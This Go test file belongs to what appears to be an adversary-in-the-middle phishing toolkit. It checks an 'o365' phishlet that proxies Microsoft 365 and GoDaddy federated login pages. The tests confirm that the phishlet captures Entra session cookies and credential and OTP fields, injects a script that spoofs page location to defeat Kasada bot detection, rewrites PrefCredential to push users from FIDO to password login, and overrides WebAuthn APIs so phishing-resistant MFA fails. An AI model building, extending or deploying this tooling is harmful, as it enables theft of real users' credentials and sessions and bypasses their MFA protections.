package core

import (
	"regexp"
	"strings"
	"testing"
)

const o365Path = "../phishlets/o365.yaml"

func loadO365(t *testing.T) *Phishlet {
	t.Helper()
	pl, err := NewPhishlet("o365", o365Path, nil, nil)
	if err != nil {
		t.Fatalf("phishlet load failed: %v", err)
	}
	return pl
}

func TestO365_Load(t *testing.T) {
	pl := loadO365(t)
	if pl.Name != "o365" {
		t.Errorf("name = %q, want o365", pl.Name)
	}
}

func TestO365_ProxyHostCount(t *testing.T) {
	pl := loadO365(t)
	// 2 msft auth + 5 office + 3 live + 4 cdn + 10 godaddy + 3 ms portals = 27
	const want = 27
	if got := len(pl.proxyHosts); got != want {
		t.Errorf("proxy_hosts = %d, want %d", got, want)
	}
}

func TestO365_GoDaddyHostsPresent(t *testing.T) {
	pl := loadO365(t)
	wantSubs := map[string]bool{
		"sso": false, "ssoss": false, "emailss": false,
		"mya": false, "accountgd": false, "wwwgd": false,
		"idpgd": false, "loginss": false, "img1": false, "img6": false,
	}
	for _, h := range pl.proxyHosts {
		if _, ok := wantSubs[h.phish_subdomain]; ok {
			wantSubs[h.phish_subdomain] = true
		}
	}
	for sub, found := range wantSubs {
		if !found {
			t.Errorf("GoDaddy proxy host %q missing", sub)
		}
	}
}

func TestO365_MicrosoftPortalHostsPresent(t *testing.T) {
	pl := loadO365(t)
	wantSubs := map[string]bool{
		"accountms": false, "mysignins": false, "loginms": false,
	}
	for _, h := range pl.proxyHosts {
		if _, ok := wantSubs[h.phish_subdomain]; ok {
			wantSubs[h.phish_subdomain] = true
		}
	}
	for sub, found := range wantSubs {
		if !found {
			t.Errorf("MS portal proxy host %q missing", sub)
		}
	}
}

func TestO365_AuthTokenDomains(t *testing.T) {
	pl := loadO365(t)
	wantDomains := []string{
		".login.microsoftonline.com",
		".login.windows.net",
		".microsoftonline.com",
		".office365.com",
		".office.com",
		".outlook.office365.com",
		".login.live.com",
		".live.com",
		"sso.godaddy.com",
		".godaddy.com",
		"idp.godaddy.com",
		"login.secureserver.net",
		"sso.secureserver.net",
		"email.secureserver.net",
		".microsoft.com",
		"adfs.*",
		"fs.*",
		"sts.*",
	}
	got := make(map[string]bool)
	for domain := range pl.cookieAuthTokens {
		got[domain] = true
	}
	for _, d := range wantDomains {
		if !got[d] {
			t.Errorf("auth_token domain %q missing", d)
		}
	}
}

func TestO365_EntraCookiesPresent(t *testing.T) {
	pl := loadO365(t)
	tokens, ok := pl.cookieAuthTokens[".login.microsoftonline.com"]
	if !ok {
		t.Fatal("no tokens for .login.microsoftonline.com")
	}
	wantKeys := []string{"ESTSAUTH", "ESTSAUTHPERSISTENT", "Ests-Sso-State", "Ests-Sso-State-Compat"}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	for _, k := range wantKeys {
		if !found[k] {
			t.Errorf("expected cookie %q not found in .login.microsoftonline.com tokens", k)
		}
	}
}

func TestO365_EmailSecureserverTokens(t *testing.T) {
	pl := loadO365(t)
	if _, ok := pl.cookieAuthTokens["email.secureserver.net"]; !ok {
		t.Error("auth_tokens missing for email.secureserver.net")
	}
}

func TestO365_CredentialFields(t *testing.T) {
	pl := loadO365(t)
	wantKeys := []string{"email", "accesspass", "otc", "code", "otp", "pin", "UserName", "Password"}
	found := make(map[string]bool)
	for _, f := range pl.custom {
		if f.key != nil {
			found[f.key.String()] = true
		}
	}
	for _, k := range wantKeys {
		if !found[k] {
			t.Errorf("credential field %q missing from credentials.custom", k)
		}
	}
}

func TestO365_AuthUrls(t *testing.T) {
	pl := loadO365(t)
	wantPaths := []string{
		"/kmsi",
		"/common/SAS/ProcessAuth",
		"/common/windowstransport",
		"/common/oauth2/v2.0/token",
	}
	for _, want := range wantPaths {
		matched := false
		for _, re := range pl.authUrls {
			if re.MatchString(want) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("auth_url %q not matched by any auth_urls entry", want)
		}
	}
}

func TestO365_KasadaSpoofer(t *testing.T) {
	// Find the Kasada sub_filter in the parsed subfilters for sso.godaddy.com
	pl := loadO365(t)
	sfs, ok := pl.subfilters["sso.godaddy.com"]
	if !ok {
		t.Fatal("no subfilters for sso.godaddy.com")
	}

	var kasadaSF *SubFilter
	for i := range sfs {
		if strings.Contains(sfs[i].replace, "Object.defineProperty") {
			kasadaSF = &sfs[i]
			break
		}
	}
	if kasadaSF == nil {
		t.Fatal("Kasada spoofer sub_filter not found for sso.godaddy.com")
	}

	// Regex must compile and match a real <head> tag
	re, err := regexp.Compile(kasadaSF.regexp)
	if err != nil {
		t.Fatalf("Kasada search regex failed to compile: %v", err)
	}
	testHTML := `<!DOCTYPE html><html><head lang="en"><title>GoDaddy</title>`
	if !re.MatchString(testHTML) {
		t.Error("Kasada search regex did not match test HTML")
	}

	// $1 backreference must inject script right after <head>
	injected := re.ReplaceAllString(testHTML, kasadaSF.replace)
	if !strings.Contains(injected, `<head lang="en"><script>`) {
		t.Errorf("$1 backreference injection malformed; got: %s", injected[:min(len(injected), 200)])
	}

	// All six location/document properties must be covered
	for _, prop := range []string{
		`location.origin`, `location.href`, `location.protocol`, `location.port`,
		`document.URL`, `document.baseURI`,
	} {
		field := strings.Split(prop, ".")[1]
		if !strings.Contains(kasadaSF.replace, `"`+field+`"`) {
			t.Errorf("Kasada spoofer missing property %q", prop)
		}
	}
}

func TestO365_PrefCredentialDowngrade(t *testing.T) {
	pl := loadO365(t)
	sfs, ok := pl.subfilters["login.microsoftonline.com"]
	if !ok {
		t.Fatal("no subfilters for login.microsoftonline.com")
	}
	var prefSF *SubFilter
	for i := range sfs {
		if strings.Contains(sfs[i].regexp, "PrefCredential") {
			prefSF = &sfs[i]
			break
		}
	}
	if prefSF == nil {
		t.Fatal("PrefCredential sub_filter not found")
	}
	re, err := regexp.Compile(prefSF.regexp)
	if err != nil {
		t.Fatalf("PrefCredential regex compile error: %v", err)
	}
	for _, input := range []string{
		`{"PrefCredential":4,"HasPassword":true}`,
		`{"PrefCredential": 4,"HasPassword":true}`,
	} {
		result := re.ReplaceAllString(input, prefSF.replace)
		if strings.Contains(result, `"PrefCredential":4`) || strings.Contains(result, `"PrefCredential": 4`) {
			t.Errorf("PrefCredential not replaced in: %s → %s", input, result)
		}
		if !strings.Contains(result, `"PrefCredential":1`) {
			t.Errorf("PrefCredential not set to 1 in: %s → %s", input, result)
		}
	}
}

func TestO365_FidoJsInject(t *testing.T) {
	pl := loadO365(t)
	if len(pl.js_inject) == 0 {
		t.Fatal("js_inject section is empty")
	}
	js := pl.js_inject[0]

	// Trigger domain
	if len(js.trigger_domains) == 0 || js.trigger_domains[0] != "login.microsoftonline.com" {
		t.Errorf("js_inject trigger_domain = %v, want [login.microsoftonline.com]", js.trigger_domains)
	}
	// Script must override the key WebAuthn APIs
	for _, sym := range []string{
		"PublicKeyCredential",
		"isUserVerifyingPlatformAuthenticatorAvailable",
		"isConditionalMediationAvailable",
		"navigator.credentials.get",
		"NotAllowedError",
	} {
		if !strings.Contains(js.script, sym) {
			t.Errorf("js_inject script missing symbol %q", sym)
		}
	}
	// Path regex must match arbitrary login paths
	if len(js.trigger_paths) == 0 {
		t.Fatal("js_inject has no trigger_paths")
	}
	for _, path := range []string{"/", "/common/GetCredentialType", "/common/SAS/BeginAuth", "/common/oauth2/v2.0/authorize"} {
		if !js.trigger_paths[0].MatchString(path) {
			t.Errorf("js_inject trigger_path did not match %q", path)
		}
	}
}

func TestO365_LoginSecureserverSubFilters(t *testing.T) {
	pl := loadO365(t)
	sfs, ok := pl.subfilters["login.secureserver.net"]
	if !ok {
		t.Fatal("no subfilters for login.secureserver.net (new section missing)")
	}
	if len(sfs) < 3 {
		t.Errorf("login.secureserver.net subfilters = %d, want >= 3", len(sfs))
	}
}

func TestO365_BareHostnameGoDaddyRewrites(t *testing.T) {
	pl := loadO365(t)
	sfs, ok := pl.subfilters["login.microsoftonline.com"]
	if !ok {
		t.Fatal("no subfilters for login.microsoftonline.com")
	}
	// Bare {hostname} rewrites (no https:// prefix) for GoDaddy federation redirects
	bareCount := 0
	for _, sf := range sfs {
		if !strings.HasPrefix(sf.regexp, "https://") && strings.Contains(sf.domain, "secureserver") ||
			!strings.HasPrefix(sf.regexp, "https://") && strings.Contains(sf.domain, "godaddy") {
			bareCount++
		}
	}
	if bareCount < 3 {
		t.Errorf("bare-hostname GoDaddy rewrites from login.microsoftonline.com = %d, want >= 3", bareCount)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
